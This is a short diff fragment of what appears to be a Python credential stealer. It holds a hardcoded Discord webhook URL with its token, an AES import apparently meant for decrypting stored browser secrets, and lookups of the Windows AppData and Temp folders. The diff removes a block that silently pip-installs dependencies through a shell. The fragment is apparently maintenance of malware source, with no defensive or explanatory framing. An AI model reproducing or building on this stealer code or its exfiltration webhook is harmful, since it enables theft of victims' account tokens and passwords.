@@ -19,18 +19,6 @@ from Crypto.Cipher import AES
 hook = "https://discord.com/api/webhooks/1052224030742155364/gzFAIJH0qQCjGN4u1tsGv56Mc1u5tCJVhU5YedJNBkT0FAe0JLU5X_uv6oakP1bT-ADY"
 DETECTED = False
 
-
-requirements = [
-    ["requests", "requests"],
-    ["Crypto.Cipher", "pycryptodome"]
-]
-for modl in requirements:
-    try: __import__(modl[0])
-    except:
-        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
-        time.sleep(3)
-
-
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 temp = os.getenv("TEMP")
